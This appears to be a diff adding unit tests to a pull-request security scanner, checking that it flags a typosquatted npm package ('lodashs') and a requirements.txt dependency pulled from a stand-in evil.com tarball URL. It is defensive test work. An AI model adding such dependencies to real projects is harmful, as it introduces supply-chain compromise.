@@ -482,4 +482,108 @@ describe("processScanJob chunk failures", () => {
       expect(commentBody).toContain("`tests/mock.ts`");
     });
   });
+
+  describe("deterministic dependency security checks (#2003)", () => {
+    it("reports typosquat findings in package.json with line number and package name", async () => {
+      const manifestFiles = [
+        {
+          filename: "package.json",
+          patch: `--- a/package.json
++++ b/package.json
+@@ -10,3 +10,4 @@
+   "dependencies": {
+     "express": "^4.18.2",
++    "lodashs": "^4.17.21"
+   }
+`,
+        },
+      ];
+
+      mocks.listComments.mockResolvedValue({ data: [] });
+      mocks.createComment.mockResolvedValue({ data: { id: 2003 } });
+      mocks.scanPullRequest.mockResolvedValue([]);
+
+      const result = await processScanJob(
+        { ...jobData, fileChanges: manifestFiles } as ScanJobData,
+        undefined,
+        { report: true, persist: false, enrich: false },
+      );
+
+      const typoFinding = result.findings.find((f) =>
+        f.matchedSignatures?.includes("DEPENDENCY_TYPOSQUAT"),
+      );
+      expect(typoFinding).toBeDefined();
+      expect(typoFinding?.severity).toBe("HIGH");
+      expect(typoFinding?.description).toContain("lodashs");
+      expect(typoFinding?.description).toContain("lodash");
+      expect(typoFinding?.lineStart).toBe(12);
+
+      const commentBody = mocks.createComment.mock.calls[0][0].body;
+      expect(commentBody).toContain("DEPENDENCY_TYPOSQUAT");
+      expect(commentBody).toContain("`package.json`");
+      expect(commentBody).toContain("lodashs");
+    });
+
+    it("reports git and tarball dependencies in requirements.txt", async () => {
+      const pyFiles = [
+        {
+          filename: "requirements.txt",
+          patch: `--- a/requirements.txt
++++ b/requirements.txt
+@@ -1,2 +1,3 @@
+ flask==2.0.1
++https://evil.com/packages/pkg-1.0.0.tar.gz
+`,
+        },
+      ];
+
+      mocks.listComments.mockResolvedValue({ data: [] });
+      mocks.createComment.mockResolvedValue({ data: { id: 2004 } });
+      mocks.scanPullRequest.mockResolvedValue([]);
+
+      const result = await processScanJob(
+        { ...jobData, fileChanges: pyFiles } as ScanJobData,
+        undefined,
+        { report: true, persist: false, enrich: false },
+      );
+
+      const tarballFinding = result.findings.find((f) =>
+        f.matchedSignatures?.includes("DEPENDENCY_GIT_OR_TARBALL"),
+      );
+      expect(tarballFinding).toBeDefined();
+      expect(tarballFinding?.severity).toBe("HIGH");
+      expect(tarballFinding?.codeSnippet).toContain("pkg-1.0.0.tar.gz");
+    });
+
+    it("does not report typosquats for legitimate packages", async () => {
+      const safeFiles = [
+        {
+          filename: "package.json",
+          patch: `--- a/package.json
++++ b/package.json
+@@ -10,3 +10,4 @@
+   "dependencies": {
+     "express": "^4.18.2",
++    "lodash": "^4.17.21"
+   }
+`,
+        },
+      ];
+
+      mocks.listComments.mockResolvedValue({ data: [] });
+      mocks.createComment.mockResolvedValue({ data: { id: 2005 } });
+      mocks.scanPullRequest.mockResolvedValue([]);
+
+      const result = await processScanJob(
+        { ...jobData, fileChanges: safeFiles } as ScanJobData,
+        undefined,
+        { report: true, persist: false, enrich: false },
+      );
+
+      const typoFinding = result.findings.find((f) =>
+        f.matchedSignatures?.includes("DEPENDENCY_TYPOSQUAT"),
+      );
+      expect(typoFinding).toBeUndefined();
+    });
+  });
 });
